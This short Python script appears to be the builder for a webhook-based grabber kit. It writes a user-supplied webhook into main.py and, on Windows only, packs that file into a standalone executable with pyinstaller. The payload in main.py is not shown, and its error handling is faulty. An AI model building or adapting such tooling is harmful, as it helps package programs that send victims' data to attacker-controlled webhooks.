import time
import platform
import os

webhook = input("What is your webhook? ")

search_text = "run builder.py first :skull:"

replace_text = webhook

try:
    with open(r"main.py", "r") as file:

        data = file.read()

        data = data.replace(search_text, replace_text)

    with open(r"main.py", "w") as file:

        file.write(data)
    print("building")
    if platform.system() == "Windows":
        pass
    else:
        quit()

    try:
        os.system("pyinstaller --onefile main.py")

    except ModuleNotFoundError:
        os.system("pip install pyinstaller")

except:
    pass
